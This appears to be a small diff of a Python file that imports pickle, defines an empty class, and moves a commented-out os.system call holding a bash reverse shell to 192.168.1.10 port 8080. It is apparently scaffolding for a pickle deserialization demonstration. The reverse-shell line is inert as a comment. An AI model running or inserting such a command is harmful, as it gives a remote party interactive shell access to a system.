@@ -1,10 +1,11 @@
 import pickle
 
+# os.system('/bin/bash -c
+#           "/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"')
 
-        # os.system('/bin/bash -c
-        #           "/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"')
 
 class foobar:
+
     def __init__(self):
         pass
 
